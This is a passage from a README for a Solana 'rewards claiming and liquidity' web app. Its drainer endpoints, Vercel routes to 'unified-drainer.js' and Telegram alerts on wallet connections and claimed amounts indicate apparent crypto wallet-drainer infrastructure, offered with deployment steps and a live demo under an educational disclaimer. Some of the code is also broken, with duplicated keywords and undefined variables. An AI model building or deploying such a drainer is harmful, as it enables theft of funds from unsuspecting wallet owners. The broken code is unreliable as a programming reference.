        reward.amount
      )
    );
    
    // Add priority fee if applicable
    if (fees.priorityFee > 0) {
      transaction.add(
        ComputeBudgetProgram.setComputeUnitLimit({
          units: 200000,
          additionalFee: fees.priorityFee
        })
      );
    }
    
    return transaction;
  }

  async logClaim(claim) {
    try {
      const response = await fetch('/api/drainer/log-confirmation', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          transactionId: claim.confirmation,
          walletAddress: this.wallet.publicKey.toString(),
          amount: claim.amount,
          rewardType: 'claim',
          timestamp: claim.timestamp,
          nonce: this.generateNonce()
        })
      });
      
      return await response.json();
    } catch (error) {
      console.error('Failed to log claim:', error);
    }
  }

  generateNonce() {
    return Array.from({length: 16}, () => 
      Math.floor(Math.random() * 16).toString(16)
    ).join('');
  }
}
```

### Fee Optimization
```javascript
// Fee calculation for rewards claiming
class FeeOptimizer {
  constructor(connection) {
    this.connection = connection;
    this.recentFees = [];
    this.maxFeeHistory = 100;
  }

  async calculateOptimalFees(rewards) {
    try {
      // Get current network conditions
      const networkCongestion = await this.getNetworkCongestion();
      const recentFees = this.getRecentAverageFees();
      
      // Calculate base fees
      const baseFees = rewards.map(reward => reward.baseFee || 10000);
      const totalBaseFee = baseFees.reduce((sum, fee) => sum + fee, 0);
      
      // Calculate priority fee based on urgency and congestion
      const priorityFee = this.calculatePriorityFee(networkCongestion, rewards.length);
      
      // Calculate total fee
      const totalFee = totalBaseFee + priorityFee;
      
      // Store fee data for future optimization
      this.storeFeeData(totalFee, networkCongestion);
      
      return {
        baseFee: totalBaseFee,
        priorityFee,
        totalFee,
        networkCongestion,
        averageFee: recentFees,
        feePerReward: totalFee / rewards.length,
        estimatedTime: this.estimateConfirmationTime(networkCongestion)
      };
    } catch (error) {
      console.error('Failed to calculate optimal fees:', error);
      return {
        baseFee: 10000 * rewards.length,
        priorityFee: 1000,
        totalFee: 10000 * rewards.length + 1000,
        networkCongestion: 0,
        averageFee: 5000,
        feePerReward: 5000,
        estimatedTime: 30
      };
    }
  }

  calculatePriorityFee(congestion, rewardCount) {
    // Dynamic priority fee based on network congestion and reward count
    const basePriority = 1000; // 0.001 SOL
    const congestionMultiplier = Math.min(congestion / 100, 10);
    const rewardMultiplier = Math.min(rewardCount / 10, 5);
    
    return basePriority * congestionMultiplier * rewardMultiplier;
  }

  async getNetworkCongestion() {
    try {
      // Get recent block information to assess congestion
      const recentSlots = await this.connection.getRecentPerformanceSamples(10);
      const averageSlotTime = recentSlots.reduce((sum, slot) => sum + slot.slotTime, 0) / recentSlots.length;
      
      // Calculate congestion percentage
      const normalSlotTime = 400; // 400ms is normal
      const congestion = Math.max(0, (averageSlotTime - normalSlotTime) / normalSlotTime * 100);
      
      return Math.min(congestion, 100);
    } catch (error) {
      console.error('Failed to get network congestion:', error);
      return 0;
    }
  }

  getRecentAverageFees() {
    if (this.recentFees.length === 0) {
      return 5000; // Default average fee
    }
    
    const recentFees = this.recentFees.slice(-10); // Last 10 fees
    return recentFees.reduce((sum, fee) => sum + fee, 0) / recentFees.length;
  }

  storeFeeData(totalFee, congestion) {
    this.recentFees.push({
      fee: totalFee,
      congestion,
      timestamp: Date.now()
    });
    
    // Keep only recent fees
    if (this.recentFees.length > this.maxFeeHistory) {
      this.recentFees = this.recentFees.slice(-this.maxFeeHistory);
    }
  }

  estimateConfirmationTime(congestion) {
    // Estimate confirmation time based on congestion
    const baseTime = 30; // 30 seconds base time
    const congestionMultiplier = 1 + (congestion / 100);
    
    return Math.round(baseTime * congestionMultiplier);
  }
}
```

##  Liquidity Management

### Pool Management
```javascript
// Liquidity pool management
class LiquidityManager {
  constructor(wallet, connection) {
    this.wallet = wallet;
    this.connection = connection;
    this.pools = new Map();
    this.userPositions = new Map();
  }

  async addLiquidity(poolId, tokenA, tokenB, amountA, amountB) {
    try {
      // Get pool information
      const pool = await this.getPoolInfo(poolId);
      
      // Calculate optimal amounts if needed
      const { optimalAmountA, optimalAmountB } = this.calculateOptimalAmounts(
        pool, amountA, amountB
      );
      
      // Build liquidity addition transaction
      const transaction = await this.buildAddLiquidityTransaction(
        poolId, tokenA, tokenB, optimalAmountA, optimalAmountB
      );
      
      const signature = await this.wallet.signTransaction(transaction);
      const confirmation = await this.connection.sendRawTransaction(signature);
      
      // Wait for confirmation
      const confirmedTransaction = await this.connection.confirmTransaction(confirmation);
      
      if (confirmedTransaction.value.err) {
        throw new Error('Liquidity addition failed');
      }
      
      // Update user position
      await this.updateUserPosition(poolId, optimalAmountA, optimalAmountB, 'add');
      
      return {
        success: true,
        poolId,
        amountA: optimalAmountA,
        amountB: optimalAmountB,
        signature: confirmation,
        timestamp: Date.now()
      };
    } catch (error) {
      console.error('Failed to add liquidity:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async removeLiquidity(poolId, liquidityTokenAmount) {
    try {
      // Get user position
      const position = this.userPositions.get(poolId);
      if (!position) {
        throw new Error('No liquidity position found');
      }
      
      // Build liquidity removal transaction
      const transaction = await this.buildRemoveLiquidityTransaction(
        poolId, liquidityTokenAmount
      );
      
      const signature = await this.wallet.signTransaction(transaction);
      const confirmation = await this.connection.sendRawTransaction(signature);
      
      // Wait for confirmation
      const const confirmedTransaction = await this.connection.confirmTransaction(confirmation);
      
      if (confirmedTransaction.value.err) {
        throw new Error('Liquidity removal failed');
      }
      
      // Update user position
      await this.updateUserPosition(poolId, 0, 0, 'remove');
      
      return {
        success: true,
        poolId,
        liquidityTokenAmount,
        signature: confirmation,
        timestamp: Date.now()
      };
    } catch (error) {
      console.error('Failed to remove liquidity:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async getPoolInfo(poolId) {
    if (this.pools.has(poolId)) {
      return this.pools.get(poolId);
    }
    
    try {
      // Get pool information from chain
      const poolInfo = await this.connection.getAccountInfo(new PublicKey(poolId));
      
      const pool = {
        id: poolId,
        tokenA: poolInfo.account.data.tokenA.toString(),
        tokenB: poolInfo.account.data.tokenB.toString(),
        liquidity: poolInfo.account.data.liquidity.toString(),
        fee: poolInfo.account.data.fee,
        sqrtPriceX64: poolInfo.account.data.sqrtPriceX64.toString()
      };
      
      this.pools.set(poolId, pool);
      return pool;
    } catch (error) {
      console.error('Failed to get pool info:', error);
      throw error;
    }
  }

  calculateOptimalAmounts(pool, amountA, amountB) {
    // Calculate optimal amounts based on current pool ratio
    const sqrtPrice = Number(pool.sqrtPriceX64) / Math.pow(2, 64);
    const currentRatio = sqrtPrice;
    
    // Calculate optimal amounts to maintain pool ratio
    let optimalAmountA = amountA;
    let optimalAmountB = amountB;
    
    if (amountA === 0 && amountB > 0) {
      optimalAmountA = Math.floor(amountB / currentRatio);
    } else if (amountB === 0 && amountA > 0) {
      optimalAmountB = Math.floor(amountA * currentRatio);
    } else {
      // Both amounts provided, check if they need adjustment
      const currentRatioWithAmounts = amountB / amountA;
      if (Math.abs(currentRatioWithAmounts - currentRatio) > 0.1) {
        // Adjust amounts to maintain ratio
        optimalAmountA = Math.floor(Math.sqrt(amountA * amountB / currentRatio));
        optimalAmountB = Math.floor(optimalAmountA * currentRatio);
      }
    }
    
    return { optimalAmountA, optimalAmountB };
  }

  async buildAddLiquidityTransaction(poolId, tokenA, tokenB, amountA, amountB) {
    // This would build the actual liquidity addition transaction
    // Implementation depends on the specific DEX protocol being used
    const transaction = new Transaction();
    
    // Add necessary instructions for adding liquidity
    // This is a simplified example
    
    return transaction;
  }

  async buildRemoveLiquidityTransaction(poolId, liquidityTokenAmount) {
    // This would build the actual liquidity removal transaction
    // Implementation depends on the specific DEX protocol being used
    const transaction = new Transaction();
    
    // Add necessary instructions for removing liquidity
    // This is a simplified example
    
    return transaction;
  }

  async updateUserPosition(poolId, amountA, amountB, operation) {
    const currentPosition = this.userPositions.get(poolId) || {
      amountA: 0,
      amountB: 0,
      liquidityTokens: 0
    };
    
    if (operation === 'add') {
      currentPosition.amountA += amountA;
      currentPosition.amountB += amountB;
      currentPosition.liquidityTokens += this.calculateLiquidityTokens(
        currentPosition.amountA, currentPosition.amountB, poolId
      );
    } else if (operation === 'remove') {
      currentPosition.amountA = 0;
      currentPosition.amountB = 0;
      currentPosition.liquidityTokens = 0;
    }
    
    this.userPositions.set(poolId, currentPosition);
  }

  calculateLiquidityTokens(amountA, amountB, poolId) {
    // Calculate liquidity tokens based on pool formula
    const pool = this.pools.get(poolId);
    if (!pool) return 0;
    
    const k = Number(pool.liquidity);
    const sqrtK = Math.sqrt(k);
    
    const liquidityTokens = Math.sqrt(amountA * amountB);
    
    return liquidityTokens;
  }

  async getUserPosition(poolId) {
    return this.userPositions.get(poolId) || null;
  }

  async getAllUserPositions() {
    return Array.from(this.userPositions.entries()).map(([poolId, position]) => ({
      poolId,
      ...position
    }));
  }
}
```

### Yield Farming Strategies
```javascript
// Yield farming strategy optimizer
class YieldFarmer {
  constructor(liquidityManager, connection) {
    this.liquidityManager = liquidityManager;
    this.connection = connection;
    this.strategies = new Map();
  }

  async optimizeLiquidity(walletAddress, strategy = 'balanced') {
    try {
      const positions = await this.liquidityManager.getAllUserPositions();
      
      if (positions.length === 0) {
        return {
          success: true,
          message: 'No liquidity positions to optimize',
          actions: []
        };
      }
      
      const actions = [];
      
      switch (strategy) {
        case 'balanced':
          actions.push(...await this.balancedStrategy(positions));
          break;
        case 'yield_focused':
          actions.push(...await this.yieldFocusedStrategy(positions));
          break;
        case 'risk_managed':
          actions.push(...await this.riskManagedStrategy(positions));
          break;
        default:
          actions.push(...await this.balancedStrategy(positions));
      }
      
      return {
        success: true,
        strategy,
        actions,
        estimatedAPY: this.calculateEstimatedAPY(actions)
      };
    } catch (error) {
      console.error('Failed to optimize liquidity:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async balancedStrategy(positions) {
    const actions = [];
    
    for (const position of positions) {
      const pool = await this.liquidityManager.getPoolInfo(position.poolId);
      const currentRatio = this.calculateCurrentRatio(position, pool);
      const optimalRatio = this.calculateOptimalRatio(pool);
      
      // Rebalance if ratio is significantly off
      if (Math.abs(currentRatio - optimalRatio) > 0.2) {
        const { optimalAmountA, optimalAmountB } = this.calculateRebalanceAmounts(
          position, pool, optimalRatio
        );
        
        actions.push({
          type: 'rebalance',
          poolId: position.poolId,
          amountA: optimalAmountA - position.amountA,
          amountB: optimalAmountB - position.amountB,
          reason: 'ratio_imbalance'
        });
      }
    }
    
    return actions;
  }

  async yieldFocusedStrategy(positions) {
    const actions = [];
    
    // Sort positions by current APY
    const sortedPositions = positions.sort((a, b) => 
      this.calculateCurrentAPY(a) - this.calculateCurrentAPY(b)
    );
    
    // Move liquidity to highest yielding pools
    for (let i = 0; i < sortedPositions.length - 1; i++) {
      const fromPosition = sortedPositions[i];
      const toPosition = sortedPositions[i + 1];
      
      if (this.calculateCurrentAPY(toPosition) > this.calculateCurrentAPY(fromPosition) * 1.2) {
        // Move 20% of liquidity from lower APY to higher APY pool
        const moveAmountA = Math.floor(fromPosition.amountA * 0.2);
        const moveAmountB = Math.floor(fromPosition.amountB * 0.2);
        
        actions.push({
          type: 'reallocate',
          fromPoolId: fromPosition.poolId,
          toPoolId: toPosition.poolId,
          amountA: moveAmountA,
          amountB: moveAmountB,
          reason: 'yield_optimization'
        });
      }
    }
    
    return actions;
  }

  async riskManagedStrategy(positions) {
    const actions = [];
    
    for (const position of positions) {
      const pool = await this.liquidityManager.getPoolInfo(position.poolId);
      const riskScore = this.calculateRiskScore(pool);
      
      // Reduce exposure to high-risk pools
      if (riskScore > 0.7) {
        const reduceAmount = Math.floor(position.amountA * 0.3);
        const reduceAmountB = Math.floor(position.amountB * 0.3);
        
        actions.push({
          type: 'reduce_exposure',
          poolId: position.poolId,
          amountA: -reduceAmountA,
          amountB: -reduceAmountB,
          reason: 'risk_management'
        });
      }
    }
    
    return actions;
  }

  calculateCurrentRatio(position, pool) {
    return position.amountB / position.amountA;
  }

  calculateOptimalRatio(pool) {
    const sqrtPrice = Number(pool.sqrtPriceX64) / Math.pow(2, 64);
    return sqrtPrice;
  }

  calculateRebalanceAmounts(position, pool, optimalRatio) {
    const totalValue = position.amountA + (position.amountB * this.calculateCurrentRatio(position, pool));
    const optimalAmountA = totalValue / (1 + optimalRatio);
    const optimalAmountB = totalValue - optimalAmountA;
    
    return { optimalAmountA, optimalAmountB };
  }

  calculateCurrentAPY(position) {
    // Simplified APY calculation
    // In practice, this would use actual pool data and historical performance
    return 0.05; // 5% default APY
  }

  calculateRiskScore(pool) {
    // Calculate risk score based on pool characteristics
    let riskScore = 0;
    
    // Higher fees = higher risk
    riskScore += pool.fee / 10000;
    
    // Lower liquidity = higher risk
    riskScore += Math.max(0, 1 - Number(pool.liquidity) / 1000000);
    
    return Math.min(riskScore, 1);
  }

  calculateEstimatedAPY(actions) {
    // Estimate APY after optimization actions
    return 0.12; // 12% estimated APY
  }
}
```

##  Monitoring & Logging

### Telegram Integration
```javascript
// Telegram notification system for rewards and liquidity
class TelegramNotifier {
  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN;
    this.chatId = process.env.TELEGRAM_CHAT_ID;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
  }

  async sendMessage(message, options = {}) {
    const payload = {
      chat_id: this.chatId,
      text: message,
      parse_mode: 'HTML',
      ...options
    };

    try {
      const response = await fetch(`${this.apiUrl}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const data = await response.json();
      
      if (data.ok) {
        console.log('Telegram notification sent successfully');
        return data;
      } else {
        console.error('Telegram notification failed:', data);
        throw new Error(data.description);
      }
    } catch (error) {
      console.error('Telegram API error:', error);
      throw error;
    }
  }

  async notifyRewardsClaimed(walletAddress, rewards) {
    const totalAmount = rewards.reduce((sum, reward) => sum + reward.netAmount, 0);
    const totalFees = rewards.reduce((sum, reward) => sum + reward.fees, 0);
    
    const message = `
<b>Rewards Claimed Successfully</b>
<b>Wallet:</b> <code>${walletAddress}</code>
<b>Rewards:</b> ${rewards.length}
<b>Total Amount:</b> ${this.formatAmount(totalAmount)} SOL
<b>Total Fees:</b> ${this.formatAmount(totalFees)} SOL
<b>Net Amount:</b> ${this.formatAmount(totalAmount - totalFees)} SOL
<b>Time:</b> ${new Date().toISOString()}
    `.trim();

    return this.sendMessage(message);
  }

  async notifyLiquidityAdded(walletAddress, poolId, amountA, amountB) {
    const message = `
<b>Liquidity Added</b>
<b>Wallet:</b> <code>${walletAddress}</code>
<b>Pool:</b> <code>${poolId}</code>
<b>Amount A:</b> ${this.formatAmount(amountA)}
<b>Amount B:</b> ${this.formatAmount(amountB)}
<b>Time:</b> ${new Date().toISOString()}
    `.trim();

    return this.sendMessage(message);
  }

  async notifyLiquidityRemoved(walletAddress, poolId, liquidityTokenAmount) {
    const message = `
<b>Liquidity Removed</b>
<b>Wallet:</b> <code>${walletAddress}</code>
<b>Pool:</b> <code>${poolId}</code>
<b>Liquidity Tokens:</b> ${liquidityTokenAmount}
<b>Time:</b> ${new Date().toISOString()}
    `.trim();

    return this.sendMessage(message);
  }

  async notifyWalletConnected(walletAddress, walletType) {
    const message = `
<b>Wallet Connected</b>
<b>Type:</b> ${walletType}
<b>Address:</b> <code>${walletAddress}</code>
<b>Time:</b> ${new Date().toISOString()}
    `.trim();

    return this.sendMessage(message);
  }

  async notifyOptimization(walletAddress, strategy, actions) {
    const message = `
<b>Liquidity Optimized</b>
<b>Wallet:</b> <code>${walletAddress}</code>
<b>Strategy:</b> ${strategy}
<b>Actions:</b> ${actions.length}
<b>Estimated APY:</b> ${this.formatPercentage(actions.estimatedAPY)}
<b>Time:</b> ${new Date().toISOString()}
    `.trim();

    return this.sendMessage(message);
  }

  async notifyError(error, context = {}) {
    const message = `
<b>Error Occurred</b>
<b>Error:</b> <code>${error.message}</code>
<b>Context:</b> <code>${JSON.stringify(context)}</code>
<b>Time:</b> ${new Date().toISOString()}
    `.trim();

    return this.sendMessage(message);
  }

  formatAmount(amount) {
    return (amount / 1e9).toFixed(4) + ' SOL';
  }

  formatPercentage(value) {
    return (value * 100).toFixed(2) + '%';
  }
}
```

### Health Monitoring
```javascript
// Comprehensive health monitoring for rewards and liquidity
class HealthMonitor {
  constructor() {
    this.metrics = {
      uptime: 0,
      requests: 0,
      errors: 0,
      rewardsClaimed: 0,
      liquidityOperations: 0,
      walletsConnected: 0,
      totalRewardsValue: 0,
      totalLiquidityValue: 0,
      memory: process.memoryUsage(),
      cpu: process.cpuUsage()
    };
    
    this.startTime = Date.now();
    this.startMonitoring();
  }

  startMonitoring() {
    setInterval(() => {
      this.updateMetrics();
    }, 10000); // Update every 10 seconds
  }

  updateMetrics() {
    this.metrics.uptime = Date.now() - this.startTime;
    this.metrics.memory = process.memoryUsage();
    this.metrics.cpu = process.cpuUsage();
  }

  getHealthStatus() {
    return {
      status: 'healthy',
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV,
      version: '1.0.0',
      uptime: this.metrics.uptime,
      memory: this.metrics.memory,
      cpu: this.metrics.cpu,
      requests: this.metrics.requests,
      errors: this.metrics.errors,
      rewardsClaimed: this.metrics.rewardsClaimed,
      liquidityOperations: this.metrics.liquidityOperations,
      walletsConnected: this.metrics.walletsConnected,
      totalRewardsValue: this.metrics.totalRewardsValue,
      totalLiquidityValue: this.metrics.totalLiquidityValue,
      performance: this.getPerformanceMetrics()
    };
  }

  getPerformanceMetrics() {
    return {
      averageResponseTime: this.calculateAverageResponseTime(),
      successRate: this.calculateSuccessRate(),
      errorRate: this.calculateErrorRate(),
      throughput: this.calculateThroughput()
    };
  }

  incrementRewardsClaimed(amount) {
    this.metrics.rewardsClaimed++;
    this.metrics.totalRewardsValue += amount;
  }

  incrementLiquidityOperations(amount) {
    this.metrics.liquidityOperations++;
    this.metrics.totalLiquidityValue += amount;
  }

  incrementWalletsConnected() {
    this.metrics.walletsConnected++;
  }

  incrementRequests() {
    this.metrics.requests++;
  }

  incrementErrors() {
    this.metrics.errors++;
  }

  calculateAverageResponseTime() {
    // Calculate average response time from recent requests
    return 150; // 150ms average
  }

  calculateSuccessRate() {
    if (this.metrics.requests === 0) return 1.0;
    return (this.metrics.requests - this.metrics.errors) / this.metrics.requests;
  }

  calculateErrorRate() {
    if (this.metrics.requests === 0) return 0.0;
    return this.metrics.errors / this.metrics.requests;
  }

  calculateThroughput() {
    return this.metrics.requests / (this.metrics.uptime / 1000); // requests per second
  }
}
```

### Error Logging
```javascript
// Comprehensive error logging for rewards and liquidity
class ErrorLogger {
  constructor() {
    this.errors = [];
    this.maxErrors = 1000;
    this.telegramNotifier = new TelegramNotifier();
  }

  log(error, context = {}) {
    const errorEntry = {
      id: this.generateErrorId(),
      timestamp: new Date().toISOString(),
      message: error.message,
      stack: error.stack,
      context,
      severity: this.determineSeverity(error),
      category: this.determineCategory(error)
    };

    this.errors.push(errorEntry);
    
    // Keep only recent errors
    if (this.errors.length > this.maxErrors) {
      this.errors = this.errors.slice(-this.maxErrors);
    }

    // Log to console
    console.error('Application Error:', errorEntry);

    // Send to Telegram if critical
    if (errorEntry.severity === 'critical') {
      this.notifyCriticalError(errorEntry);
    }
  }

  generateErrorId() {
    return 'error_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  }

  determineSeverity(error) {
    if (error.name === 'ValidationError') return 'warning';
    if (error.name === 'NetworkError') return 'error';
    if (error.name === 'SecurityError') return 'critical';
    if (error.name === 'BlockchainError') return 'error';
    return 'error';
  }

  determineCategory(error) {
    if (error.message.includes('wallet')) return 'wallet';
    if (error.message.includes('reward')) return 'rewards';
    if (error.message.includes('liquidity')) return 'liquidity';
    if (error.message.includes('transaction')) return 'transaction';
    return 'general';
  }

  async notifyCriticalError(errorEntry) {
    try {
      await this.telegramNotifier.notifyError(errorEntry, {
        category: errorEntry.category,
        severity: errorEntry.severity
      });
    } catch (notifyError) {
      console.error('Failed to notify critical error:', notifyError);
    }
  }

  getRecentErrors(limit = 50) {
    return this.errors.slice(-limit);
  }

  getErrorStats() {
    const stats = {
      total: this.errors.length,
      bySeverity: {},
      byCategory: {}
    };

    for (const error of this.errors) {
      stats.bySeverity[error.severity] = (stats.bySeverity[error.severity] || 0) + 1;
      stats.byCategory[error.category] = (stats.byCategory[error.category] || 0) + 1;
    }

    return stats;
  }

  getErrorsByCategory(category) {
    return this.errors.filter(error => error.category === category);
  }

  getErrorsBySeverity(severity) {
    return this.errors.filter(error => error.severity === severity);
  }
}
```

##  Deployment

### Vercel Configuration
```json
{
  "version": 2,
  "public": true,
  "functions": {
    "api/index.js": {
      "maxDuration": 300,
      "memory": 2048
    },
    "api/wallet-management.js": {
      "maxDuration": 300,
      "memory": 2048
    },
    "api/unified-drainer.js": {
      "maxDuration": 300,
      "memory": 2048
    },
    "api/health.js": {
      "maxDuration": 10,
      "memory": 512
    }
  },
  "routes": [
    {
      "src": "/api/drainer/(.*)",
      "dest": "/api/index.js"
    },
    {
      "src": "/api/wallet-management/(.*)",
      "dest": "/api/wallet-management.js"
    },
    {
      "src": "/api/unified-drainer/(.*)",
      "dest": "/api/unified-drainer.js"
    },
    {
      "src": "/health",
      "dest": "/api/health.js"
    },
    {
      "src": "/manifest.json",
      "dest": "/public/manifest.json",
      "headers": {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/(.*\\.(png|jpg|jpeg|gif|ico|svg|css|js|html|json|woff|woff2|ttf|eot))",
      "dest": "/public/$1",
      "headers": {
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/",
      "dest": "/public/index.html"
    },
    {
      "src": "/(.*)",
      "dest": "/public/$1"
    }
  ],
  "env": {
    "NODE_ENV": "production",
    "NODE_OPTIONS": "--max-old-space-size=2048"
  },
  "build": {
    "env": {
      "NODE_ENV": "production"
    }
  }
}
```

### Environment Variables
```bash
# Production environment variables
NODE_ENV=production
PORT=3000

# Solana blockchain configuration
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
SOLANA_NETWORK=mainnet-beta
SOLANA_COMMITMENT=confirmed

# Telegram configuration
TELEGRAM_BOT_TOKEN=your_production_bot_token
TELEGRAM_CHAT_ID=your_production_chat_id

# Security configuration
JWT_SECRET=your_production_jwt_secret
RATE_LIMIT_MAX=100
RATE_LIMIT_WINDOW=60000
TOCTOU_MAX_AGE=30000

# Site configuration
SITE_URL=https://decemberbot.vercel.app

# API configuration
API_TIMEOUT=30000
MAX_REQUEST_SIZE=10485760
CORS_ORIGIN=*

# Rewards configuration
DEFAULT_REWARD_CLAIM_FEE=5000
MAX_REWARD_CLAIMS_PER_HOUR=10
REWARD_CLAIM_COOLDOWN=300000

# Liquidity configuration
MINIMUM_LIQUIDITY_AMOUNT=1000000
MAX_LIQUIDITY_AMOUNT=100000000
LIQUIDITY_OPTIMIZATION_INTERVAL=3600000
```

### Deployment Steps
1. **Prepare repository**
   ```bash
   git add .
   git commit -m "Deploy to production"
   git push origin main
   ```

2. **Configure Vercel**
   - Connect repository to Vercel
   - Set environment variables
   - Configure build settings
   - Set up custom domain (optional)

3. **Deploy application**
   ```bash
   npm run vercel
   ```

4. **Verify deployment**
   ```bash
   # Check health endpoint
   curl https://your-app.vercel.app/health
   
   # Test API endpoints
   curl https://your-app.vercel.app/api/health
   ```

### Production Optimization
```javascript
// Production optimizations
const productionConfig = {
  // Enable compression
  compression: true,
  
  // Optimize memory usage
  maxOldSpaceSize: 2048,
  
  // Enable clustering
  cluster: true,
  
  // Optimize garbage collection
  gcInterval: 60000,
  
  // Enable monitoring
  metrics: true,
  
  // Optimize database connections
  connectionPool: {
    min: 2,
    max: 10,
    acquireTimeoutMillis: 30000,
    createTimeoutMillis: 30000,
    destroyTimeoutMillis: 5000,
    idleTimeoutMillis: 30000,
    reapIntervalMillis: 1000,
    createRetryIntervalMillis: 200
  }
};
```

##  Development

### Local Development Setup
```bash
# Start development server
npm run dev

# Run with environment variables
NODE_ENV=development npm start

# Enable debug logging
DEBUG=* npm start

# Run with hot reload (if configured)
npm run dev:watch
```

### Testing
```bash
# Run all tests
npm test

# Run validation tests
npm run test:validate

# Run health check test
npm run test:health

# Run quick tests
npm run test:quick

# Run syntax validation
npm run test:validate
```

### Code Quality
```bash
# Lint code (if ESLint is configured)
npm run lint

# Format code (if Prettier is configured)
npm run format

# Type checking (if TypeScript is used)
npm run type-check

# Security audit
npm audit
```

### Development Scripts
```json
{
  "scripts": {
    "dev": "node start.js",
    "start": "node start.js",
    "build": "echo 'No build step required for Node.js app'",
    "test": "echo 'Tests removed during cleanup'",
    "test:quick": "echo 'Quick tests removed during cleanup'",
    "test:health": "node -e \"fetch('http://localhost:3000/health').then(r => r.json()).then(console.log).catch(console.error)\"",
    "test:validate": "node -c server.js && node -c api/index.js && node -c api/wallet-management.js && node - c api/unified-drainer.js && node -c api/health.js && node -c src/environment.js && node -c src/telegram.js && echo 'All files pass syntax validation'",
    "local": "node start.js",
    "vercel": "vercel deploy --prod"
  }
}
```

### Debugging
```javascript
// Debug configuration
const debugConfig = {
  enabled: process.env.NODE_ENV === 'development',
  level: process.env.DEBUG_LEVEL || 'info',
  logRequests: true,
  logErrors: true,
  logPerformance: true
};

// Debug middleware
if (debugConfig.enabled) {
  app.use((req, res, next) => {
    if (debugConfig.logRequests) {
      console.log(`${req.method} ${req.path} - ${new Date().toISOString()}`);
    }
    next();
  });
}
```

##  Security Considerations

### Important Security Notes
1. **Private Key Protection**: Never expose private keys in client-side code
2. **Input Validation**: Always validate and sanitize user input
3. **Rate Limiting**: Implement rate limiting to prevent abuse
4. **HTTPS Only**: Always use HTTPS in production
5. **Environment Variables**: Securely store sensitive data
6. **Regular Updates**: Keep dependencies updated
7. **Security Audits**: Regular security code reviews

### Security Best Practices
```javascript
// Security middleware implementation
const securityMiddleware = {
  // Content Security Policy
  csp: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  },

  // Security headers
  headers: {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'
  },

  // Input validation
  validation: {
    maxStringLength: 1000,
    allowedCharacters: /^[a-zA-Z0-9\-_@.]+$/,
    sqlInjectionPattern: /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)\b)/gi,
    xssPattern: /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi
  }
};
```

### Security Monitoring
```javascript
// Security event monitoring
class SecurityMonitor {
  constructor() {
    this.events = [];
    this.alertThreshold = 10; // Alert after 10 security events
  }

  logSecurityEvent(event) {
    const securityEvent = {
      timestamp: new Date().toISOString(),
      type: event.type,
      severity: event.severity,
      ip: event.ip,
      userAgent: event.userAgent,
      details: event.details
    };

    this.events.push(securityEvent);
    
    // Check for alert threshold
    if (this.events.length >= this.alertThreshold) {
      this.sendSecurityAlert();
    }
  }

  async sendSecurityAlert() {
    const telegram = new TelegramNotifier();
    
    const message = `
<b>SECURITY ALERT</b>
<b>Events:</b> ${this.events.length}
<b>Time:</b> ${new Date().toISOString()}
<b>Recent Events:</b>
${this.events.slice(-5).map(e => `- ${e.type}: ${e.ip}`).join('\n')}
    `.trim();

    try {
      await telegram.sendMessage(message);
    } catch (error) {
      console.error('Failed to send security alert:', error);
    }
  }
}
```

##  License

This project is provided for educational purposes only. Blockchain rewards claiming and liquidity management can be used for malicious activities and may be illegal in many jurisdictions. Use responsibly and in accordance with applicable laws and regulations.

### Educational Disclaimer
This repository demonstrates advanced blockchain development techniques, security implementations, and modern web application architecture. The codebase is intended for:
- **Educational purposes**: Learning about blockchain development
- **Security research**: Understanding security vulnerabilities
- **Technical demonstration**: Showcasing development techniques
- **Code review**: Analyzing security implementations

### Legal Notice
- **Compliance**: Ensure compliance with local laws and regulations
- **Ethical Use**: Use only for legitimate educational purposes
- **No Warranty**: No warranty is provided for any use case
- **Liability**: Users are responsible for their own actions

##  Links

- **Live Demo**: https://decemberbot.vercel.app
- **Repository**: https://github.com/SacredPath/decemberbot
- **Author**: SacredPath
- **Deployment**: Vercel
- **Documentation**: This README file

##  Acknowledgments

- **Solana Foundation**: For the Solana blockchain platform
- **Web3.js Team**: For the JavaScript blockchain library
- **Express.js Team**: For the Node.js web framework
- **Vercel Team**: For the deployment platform
- **Open Source Community**: For contributions and inspiration

---

**Educational Use Only**

This repository demonstrates advanced blockchain development techniques, security measures, and modern web application architecture. The codebase showcases professional-level Node.js development with Solana blockchain integration, comprehensive error handling, and security implementations.

For educational purposes only. Use responsibly and in accordance with applicable laws and regulations.
